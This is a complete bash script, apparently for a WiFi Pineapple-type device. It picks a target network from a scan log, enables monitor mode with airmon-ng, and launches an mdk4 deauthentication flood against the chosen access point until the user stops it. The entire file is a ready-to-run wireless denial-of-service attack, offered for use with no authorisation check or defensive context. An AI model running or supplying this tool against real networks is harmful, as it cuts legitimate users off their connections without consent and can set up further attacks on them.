#!/bin/bash

### WiFi Deauthentication Tool
### Terminal-Based WiFi Deauth Utility

LOG_DIR="/sd/pineappleos/logs"
LOG_FILE="$LOG_DIR/wifi_clients.list"

pause_return() {
  echo ""
  read -p "Press enter to return..."
}

banner() {
  echo "╔════════════════════════════════════════════╗"
  echo "║         WiFi Deauthentication Tool        ║"
  echo "╚════════════════════════════════════════════╝"
}

wifi_scan() {
  if [[ ! -f $LOG_FILE ]]; then
    echo "[✘] No WiFi scan log found! Perform a WiFi scan first."
    exit 1
  fi

  echo "[🔍] Displaying available networks from scan log:"
  awk -F, '{printf "[%d] SSID: %-20s | BSSID: %-17s | CH: %s\n", NR, $1, $2, $3}' "$LOG_FILE"
}

select_target() {
  TOTAL_LINES=$(wc -l < "$LOG_FILE")

  if [[ $TOTAL_LINES -eq 0 ]]; then
    echo "[✘] No available networks to select!"
    exit 1
  fi

  read -p "[☉] Select network to deauth (1-$TOTAL_LINES): " NET_NUM

  if ! [[ "$NET_NUM" =~ ^[0-9]+$ ]] || (( NET_NUM < 1 || NET_NUM > TOTAL_LINES )); then
    echo "[✘] Invalid selection."
    exit 1
  fi

  NET_INFO=$(sed -n "${NET_NUM}p" "$LOG_FILE")

  TARGET_SSID=$(echo "$NET_INFO" | cut -d, -f1)
  TARGET_BSSID=$(echo "$NET_INFO" | cut -d, -f2)
  TARGET_CHANNEL=$(echo "$NET_INFO" | cut -d, -f3)

  if [[ -z "$TARGET_SSID" || -z "$TARGET_BSSID" || -z "$TARGET_CHANNEL" ]]; then
    echo "[✘] Error parsing network information!"
    exit 1
  fi

  echo "[🎯] Target selected: SSID '$TARGET_SSID', BSSID '$TARGET_BSSID', Channel '$TARGET_CHANNEL'"
}

setup_monitor_mode() {
  echo "[⚙] Detecting wireless interfaces..."
  interfaces=($(iw dev | awk '/Interface/ {print $2}'))

  if [[ ${#interfaces[@]} -eq 0 ]]; then
    echo "[✘] No wireless interfaces detected!"
    exit 1
  fi

  echo "Available wireless interfaces:"
  for i in "${!interfaces[@]}"; do
    echo "  $((i+1))) ${interfaces[$i]}"
  done

  read -p "[⚙] Select interface for monitor mode: " iface_choice

  if ! [[ "$iface_choice" =~ ^[0-9]+$ ]] || (( iface_choice < 1 || iface_choice > ${#interfaces[@]} )); then
    echo "[✘] Invalid selection!"
    exit 1
  fi

  IFACE="${interfaces[$((iface_choice-1))]}"
  MONITOR_IFACE="${IFACE}mon"

  echo "[⚙] Enabling monitor mode on $IFACE (channel $TARGET_CHANNEL)..."
  airmon-ng start "$IFACE" "$TARGET_CHANNEL" > /dev/null 2>&1
  sleep 2

  if ! iwconfig "$MONITOR_IFACE" | grep -q "Mode:Monitor"; then
    echo "[✘] Failed to enable monitor mode!"
    exit 1
  fi

  echo "[✓] Monitor mode enabled ($MONITOR_IFACE)."
}

start_deauth_attack() {
  echo "[🚨] Initiating deauthentication attack..."
  mdk4 "$MONITOR_IFACE" d -B "$TARGET_BSSID" -c "$TARGET_CHANNEL" -s 1000 -x &> "$LOG_DIR/deauth.log" &
  ATTACK_PID=$!

  echo "[⌛] Attack in progress. Press Enter to stop."
  read
  kill "$ATTACK_PID"
  wait "$ATTACK_PID" 2>/dev/null
  echo "[✓] Deauthentication attack stopped."
}

cleanup() {
  echo "[🛠] Cleaning up and restoring interface..."
  airmon-ng stop "$MONITOR_IFACE" > /dev/null 2>&1
  rm -f "$LOG_DIR/deauth.log"
  echo "[✓] Cleanup complete. Interface restored."
}

# Main program
banner
wifi_scan
select_target
setup_monitor_mode
start_deauth_attack
cleanup

pause_return

